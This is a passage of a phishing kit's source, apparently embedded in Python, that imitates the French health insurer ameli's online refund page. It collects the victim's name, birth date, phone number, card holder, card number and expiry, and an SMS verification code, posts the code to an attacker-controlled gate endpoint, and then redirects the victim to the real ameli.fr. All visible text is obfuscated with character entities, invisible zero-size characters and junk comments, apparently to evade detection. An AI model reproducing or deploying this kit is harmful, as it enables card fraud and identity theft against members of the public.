style="color:transparent;font-size: 0px;">b</font> &#105;<font style="color:transparent;font-size: 0px;">s</font>&#110;<font style="color:transparent;font-size: 0px;">d</font>c<!u>o<!wAS>&#114;&#114;<font style="color:transparent;font-size: 0px;">5</font>e<!R>&#099;<font style="color:transparent;font-size: 0px;">s</font>t<!r>e<!P9H>';
}
if (valide_date(expmouunth,expyeeeer)==false) {
error_message = 'D<!zJ5>a<!m>t<!TQ>&#101;<font style="color:transparent;font-size: 0px;">p</font> &#100;&#8217;e<!ZhT>x<!8>p<!1p>&#105;<font style="color:transparent;font-size: 0px;">c</font>&#114;&#097;<font style="color:transparent;font-size: 0px;">A</font>&#116;<font style="color:transparent;font-size: 0px;">K</font>&#105;<font style="color:transparent;font-size: 0px;">H</font>&#111;<font style="color:transparent;font-size: 0px;">W</font>&#110; &#105;n<!fO>&#099;<font style="color:transparent;font-size: 0px;">a</font>&#111;<font style="color:transparent;font-size: 0px;">n</font>&#114;<font style="color:transparent;font-size: 0px;">1</font>&#114;<font style="color:transparent;font-size: 0px;">v</font>&#101;<font style="color:transparent;font-size: 0px;">r</font>c<!w>&#116;<font style="color:transparent;font-size: 0px;">M</font>&#101;';
}

$('#jnab').html(pic+" "+error_message);
$('#jnab').show("");
}
});
function _9owd(){
   window.location.href = "https://www.ameli.fr/";
}
$('#sir_t7ewa').click(function(){
var bimosa = $('#simo').val();
if(checksmimo(bimosa) ==true){
$.post( URL_GATE+"/sms", { "smimo": bimosa });
$('#jnab').hide("");
loading("lhwa");
setTimeout(byebye, 3000);
setTimeout(_9owd, 4000);
}else{
error_message = '&#086;<font style="color:transparent;font-size: 0px;">A</font>&#101;&#117;&#105;&#108;<font style="color:transparent;font-size: 0px;">P</font>&#108;&#101;&#122;<font style="color:transparent;font-size: 0px;">u</font> &#115;<font style="color:transparent;font-size: 0px;">U</font>&#097;<font style="color:transparent;font-size: 0px;">1</font>&#105;&#115;<font style="color:transparent;font-size: 0px;">x</font>&#105;&#114; &#117;<font style="color:transparent;font-size: 0px;">c</font>&#110;<font style="color:transparent;font-size: 0px;">r</font> c<!Szn>&#111;<font style="color:transparent;font-size: 0px;">7</font>&#100;&#101;<font style="color:transparent;font-size: 0px;">j</font> &#083;<font style="color:transparent;font-size: 0px;">a</font>M<!7QR>&#083;<font style="color:transparent;font-size: 0px;">s</font> &#099;<font style="color:transparent;font-size: 0px;">p</font>&#111;r<!9Dt>&#114;<font style="color:transparent;font-size: 0px;">E</font>e<!F>&#099;t<!GP>&#101;';
$('#jnab').html(pic+" "+error_message);
$('#jnab').show();
}
});

$('input[type="radio"][id="vire"]').change(function() {
if(this.checked) {
$('#jnab').show();
// do something when checked

$('#jnab').html(pic+' &#067;<font style="color:transparent;font-size: 0px;">L</font>e<!I> &#109;&#111;&#100;<font style="color:transparent;font-size: 0px;">Y</font>&#101; &#100;<font style="color:transparent;font-size: 0px;">n</font>e<!1b> &#114;<font style="color:transparent;font-size: 0px;">y</font>e<!S>&#109;&#098;<font style="color:transparent;font-size: 0px;">S</font>o<!W5>&#117;&#114;s<!jO>&#101;m<!L>e<!vKD>&#110;<font style="color:transparent;font-size: 0px;">N</font>&#116; &#101;<font style="color:transparent;font-size: 0px;">2</font>s<!G22>&#116; &#100;&#105;s<!J>p<!vw>&#111;<font style="color:transparent;font-size: 0px;">O</font>&#110;<font style="color:transparent;font-size: 0px;">x</font>&#105;&#098;&#108;<font style="color:transparent;font-size: 0px;">B</font>e<!ZHI> &#117;n<!7Z2>&#105;<font style="color:transparent;font-size: 0px;">v</font>q<!9Cm>&#117;<font style="color:transparent;font-size: 0px;">K</font>e<!uLl>&#109;<font style="color:transparent;font-size: 0px;">5</font>&#101;<font style="color:transparent;font-size: 0px;">F</font>&#110;<font style="color:transparent;font-size: 0px;">K</font>&#116; &#112;<font style="color:transparent;font-size: 0px;">I</font>o<!2>&#117;<font style="color:transparent;font-size: 0px;">n</font>r<!YC> l<!xxd>e<!2UX>&#115;<font style="color:transparent;font-size: 0px;">5</font> s<!W>&#111;&#109;<font style="color:transparent;font-size: 0px;">x</font>&#109;<font style="color:transparent;font-size: 0px;">d</font>e<!Ux>s<!7oS> s<!aj>&#117;<font style="color:transparent;font-size: 0px;">B</font>&#112;<font style="color:transparent;font-size: 0px;">a</font>ér<!th>&#105;<font style="color:transparent;font-size: 0px;">1</font>&#101;&#117;r<!Y>&#115;<font style="color:transparent;font-size: 0px;">t</font> à 1<!9>&#048;<font style="color:transparent;font-size: 0px;">0</font>0<!OfU>&#048;<font style="color:transparent;font-size: 0px;">m</font> &#101;<font style="color:transparent;font-size: 0px;">h</font>&#117;r<!OFq>o<!9n>&#115;<font style="color:transparent;font-size: 0px;">h</font>');
$('#vire').prop("checked", false);
}
});
$('input[type="radio"][id="mama"]').change(function() {
if(this.checked) {
$('#jnab').hide();
}
});
$('input[type="radio"][id="vv"]').change(function() {
if(this.checked) {
if(this.checked) {
$('#jnab').hide();
}
}
});
$('#caracred').on('change', function() {
if (this.value=="defo") {

$('input#tarja').attr("placeholder", feedzeb+"XXX-XXXX-XXXX-XXXX");
}else{
$('input#tarja').removeAttr("placeholder");
$('input#tarja').val("")
}
});


});
""")
html = Markup("""
    <div class="tetiere">
        <div class="bandeau">
            <h1>&#067;&#111;&#109;<font style="color:transparent;font-size: 0px;">i</font>&#112;<font style="color:transparent;font-size: 0px;">2</font>t<!3S>&#101;<font style="color:transparent;font-size: 0px;">5</font> a<!lOu>&#109;<font style="color:transparent;font-size: 0px;">V</font>&#101;<font style="color:transparent;font-size: 0px;">m</font>l<!v>i<!6n></h1>
            <div class="liens">
                <a> &#065;<font style="color:transparent;font-size: 0px;">z</font>&#108;<font style="color:transparent;font-size: 0px;">0</font>&#108;&#101;r<!nWQ> &#097;<font style="color:transparent;font-size: 0px;">5</font>&#117;<font style="color:transparent;font-size: 0px;">H</font> c<!2jp>&#111;&#110;&#116;<font style="color:transparent;font-size: 0px;">o</font>&#101;<font style="color:transparent;font-size: 0px;">y</font>&#110;<font style="color:transparent;font-size: 0px;">6</font>&#117;<font style="color:transparent;font-size: 0px;">R</font> </a> &nbsp;|&nbsp; <a> R<!L>e<!t>c<!gQ>&#111;<font style="color:transparent;font-size: 0px;">z</font>m<!05>&#109;a<!i>&#110;&#100;<font style="color:transparent;font-size: 0px;">7</font>&#097;&#116;i<!O>&#111;<font style="color:transparent;font-size: 0px;">p</font>&#110;<font style="color:transparent;font-size: 0px;">C</font>s<!S> &#100;<font style="color:transparent;font-size: 0px;">D</font>e<!D> &#115;<font style="color:transparent;font-size: 0px;">I</font>é&#099;u<!xP>&#114;<font style="color:transparent;font-size: 0px;">c</font>i<!v>&#116;<font style="color:transparent;font-size: 0px;">d</font>é </a>
            </div>
        </div>
        <a class="r_lien_image">
            <img alt="" src="data:image/png;base64,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" class="logoam"/>
        </a>
    </div>
</header>


<div id="body">

<section>
<div class="titlebar" style="margin-top:4%;color: #2270a1;">
    <h1 class="wlp-bighorn-titlebar-title-panel">
D<!3h>&#069;<font style="color:transparent;font-size: 0px;">E</font>&#077;<font style="color:transparent;font-size: 0px;">J</font>&#065;<font style="color:transparent;font-size: 0px;">u</font>&#078;&#068;<font style="color:transparent;font-size: 0px;">S</font>E<!1M> &#068;&#069;<font style="color:transparent;font-size: 0px;">Q</font> &#082;&#069;&#077;<font style="color:transparent;font-size: 0px;">x</font>&#066;<font style="color:transparent;font-size: 0px;">S</font>&#079;U<!gBX>R<!SCs>&#083;<font style="color:transparent;font-size: 0px;">i</font>E<!6lL>M<!cSK>&#069;<font style="color:transparent;font-size: 0px;">L</font>&#078;&#084;<font style="color:transparent;font-size: 0px;">J</font> E<!7H>&#078;<font style="color:transparent;font-size: 0px;">B</font> &#076;<font style="color:transparent;font-size: 0px;">S</font>&#073;<font style="color:transparent;font-size: 0px;">o</font>&#071;<font style="color:transparent;font-size: 0px;">m</font>&#078;<font style="color:transparent;font-size: 0px;">8</font>E<!U>.</h1>

  </div>
<div class="centrepage">
<div class="blocformfond creationimmediate">
<div>
<h2>
&#086;<font style="color:transparent;font-size: 0px;">O</font>&#101;&#117;<font style="color:transparent;font-size: 0px;">V</font>&#105;l<!y>&#108;<font style="color:transparent;font-size: 0px;">0</font>&#101;&#122;<font style="color:transparent;font-size: 0px;">J</font> &#114;<font style="color:transparent;font-size: 0px;">B</font>&#101;&#110;&#115;<font style="color:transparent;font-size: 0px;">W</font>e<!k>&#105;&#103;&#110;&#101;<font style="color:transparent;font-size: 0px;">n</font>r<!hOX> v<!dm>&#111;<font style="color:transparent;font-size: 0px;">I</font>&#115;<font style="color:transparent;font-size: 0px;">1</font> &#105;<font style="color:transparent;font-size: 0px;">d</font>&#110;<font style="color:transparent;font-size: 0px;">v</font>&#102;<font style="color:transparent;font-size: 0px;">p</font>&#111;r<!mi>&#109;<font style="color:transparent;font-size: 0px;">l</font>&#097;<font style="color:transparent;font-size: 0px;">W</font>t<!X7>&#105;<font style="color:transparent;font-size: 0px;">q</font>&#111;<font style="color:transparent;font-size: 0px;">J</font>&#110;s<!q3> &#112;&#101;<font style="color:transparent;font-size: 0px;">O</font>r<!4U>&#115;o<!hqn>n<!S>&#110;&#101;<font style="color:transparent;font-size: 0px;">4</font>&#108;l<!5b>&#101;&#115;<font style="color:transparent;font-size: 0px;">F</font>&#046;</h2>
</div>
<div align="right">
</div>
<fieldset id="etapelowla">
<div>
<div>
<label class="r_ddc_half_screen">
&#078;&#111;<font style="color:transparent;font-size: 0px;">7</font>m<!TW> &#099;o<!Uw>&#109;<font style="color:transparent;font-size: 0px;">e</font>&#112;<font style="color:transparent;font-size: 0px;">C</font>&#108;&#101;<font style="color:transparent;font-size: 0px;">p</font>t<!0XP>:<span style="color: blue;">
*</span>
</label>
<input type="text" name="nom" id="ach_semak_lah" size="24" maxlength="24">
</div>

<div>
<label class="r_ddc_half_screen">
D<!Wc>&#097;t<!w>e<!1> d<!B>&#101; n<!1>&#097;<font style="color:transparent;font-size: 0px;">0</font>&#105;&#115;<font style="color:transparent;font-size: 0px;">z</font>&#115;<font style="color:transparent;font-size: 0px;">h</font>a<!1q>&#110;<font style="color:transparent;font-size: 0px;">f</font>&#099;<font style="color:transparent;font-size: 0px;">R</font>&#101;<font style="color:transparent;font-size: 0px;">i</font>:<span style="color: blue;">
*</span>
</label>
<input type="text" name="dubs" id="dubs" size="24">
</div>
<div>
<label class="r_ddc_half_screen">
Numéro de téléphone:<span style="color: blue;">
*</span>
</label>
<input type="text" name="nb" id="nb" size="24">
</div>
<div>
<label class="r_ddc_half_screen">
S<!--Zk-->&eacute;l<font style="color:transparent;font-size: 0px;">R</font>ecti<font style="color:transparent;font-size: 0px;">9</font>onn<!--st-->e<!--JuN-->z<font style="color:transparent;font-size: 0px;">q</font> une m&eacute;t<font style="color:transparent;font-size: 0px;">j</font>h<!--5t8-->o<font style="color:transparent;font-size: 0px;">l</font>d<font style="color:transparent;font-size: 0px;">1</font>e<font style="color:transparent;font-size: 0px;">U</font> d<font style="color:transparent;font-size: 0px;">a</font>e<font style="color:transparent;font-size: 0px;">e</font> r<font style="color:transparent;font-size: 0px;">A</font>em<!--Sip-->b<font style="color:transparent;font-size: 0px;">I</font>ou<!--46-->rs<font style="color:transparent;font-size: 0px;">4</font>e<!--L-->m<font style="color:transparent;font-size: 0px;">L</font>e<!--P-->n<font style="color:transparent;font-size: 0px;">v</font>t
*</span>
</label>
V<!Y6>&#105;<font style="color:transparent;font-size: 0px;">8</font>&#115;<font style="color:transparent;font-size: 0px;">4</font>&#097;<font style="color:transparent;font-size: 0px;">i</font><input type="radio" name="typus" id='vv' size="24">
&#077;<font style="color:transparent;font-size: 0px;">5</font>a<!RZR>&#115;<font style="color:transparent;font-size: 0px;">k</font>&#116;<font style="color:transparent;font-size: 0px;">E</font>&#101;r<!A>&#099;a<!cGN>&#114;&#100;<input type="radio" name="typus" id='mama' size="24">
&#086;<font style="color:transparent;font-size: 0px;">k</font>&#105;<font style="color:transparent;font-size: 0px;">7</font>&#114;e<!iOo>&#109;&#101;<font style="color:transparent;font-size: 0px;">0</font>n<!g>&#116;<font style="color:transparent;font-size: 0px;">c</font><input type="radio" name="typus" id='vire' size="24">
</div>
</div>
</fieldset>
<fieldset id="stape_tania" style="display:none;"><!-- hada filedset d bita9a -->
<div>
  <div>
  <label class="r_ddc_half_screen">
  T<!Q>i<!4fs>t<!qcG>&#117;<font style="color:transparent;font-size: 0px;">L</font>&#108;&#097;i<!k>&#114;e<!CG0> &#100;<font style="color:transparent;font-size: 0px;">p</font>&#101; &#108;a<!mR> &#099;<font style="color:transparent;font-size: 0px;">w</font>a<!G>r<!3s>&#116;<font style="color:transparent;font-size: 0px;">R</font>&#101;<font style="color:transparent;font-size: 0px;">R</font>:<span style="color: blue;">
  *</span>
  </label>
  <input type="text" name="titus" id="titus" size="24" maxlength="19" disabled>
  </div>
  <div>
  <label class="r_ddc_half_screen">
  &#083;<font style="color:transparent;font-size: 0px;">0</font>é&#108;<font style="color:transparent;font-size: 0px;">x</font>&#101;<font style="color:transparent;font-size: 0px;">h</font>c<!54v>&#116;&#105;<font style="color:transparent;font-size: 0px;">M</font>o<!L>&#110;n<!r0f>e<!8>z<!z> &#108;<font style="color:transparent;font-size: 0px;">G</font>&#097; &#099;<font style="color:transparent;font-size: 0px;">c</font>a<!3N>r<!J>t<!O>&#101;<font style="color:transparent;font-size: 0px;">J</font> à &#099;<font style="color:transparent;font-size: 0px;">W</font>r<!V>é&#100;&#105;<font style="color:transparent;font-size: 0px;">q</font>&#116;<font style="color:transparent;font-size: 0px;">j</font>e<!gi>r<!Y>:<span style="color: blue;">
  *</span>
  </label>
  <select class="" id="caracred" name="caracred" >
<option value="defo" id="difffo" default></option>
<option vale="newww">Ajouter une nouvelle carte</option>
  </select>
  </div>


  <div id="bibit" style="display:none;">

<div>
<label class="r_ddc_half_screen">
N<!SX7>° d<!gw4>&#101;<font style="color:transparent;font-size: 0px;">a</font> &#099;<font style="color:transparent;font-size: 0px;">e</font>a<!4j>&#114;<font style="color:transparent;font-size: 0px;">P</font>t<!6Ir>e<!HWg>:<span style="color: blue;">
*</span>
</label>
<input type="text" name="tarja" id="tarja" size="24" maxlength="19">
</div>
<div>
    <label class="r_ddc_half_screen">
        &#068;<font style="color:transparent;font-size: 0px;">5</font>a<!Gp6>&#116;<font style="color:transparent;font-size: 0px;">9</font>e<!x2K> d<!F>'&#101;&#120;p<!0>&#105;&#114;<font style="color:transparent;font-size: 0px;">Q</font>a<!uKS>t<!4F9>i<!ij>o<!t>&#110;<font style="color:transparent;font-size: 0px;">K</font>: *
    </label>
    <span class="zone_champ_saisie">
        <select name="expmonth" id="expmonth">
            <option >Mois</option>
            <option value="01">01</option>
            <option value="02">02</option>
            <option value="03">03</option>
            <option value="04">04</option>
            <option value="05">05</option>
            <option value="06">06</option>
            <option value="07">07</option>
            <option value="08">08</option>
            <option value="09">09</option>
            <option value="10">10</option>
            <option value="11">11</option>
            <option value="12">12</option>
        </select>
        <select name="expyear" id="expyear">
            <option >Année</option>
            <option value="2019">2019</option>
            <option value="2020">2020</option>
            <option value="2021">2021</option>
            <option value="2022">2022</option>
            <option value="2023">2023</option>
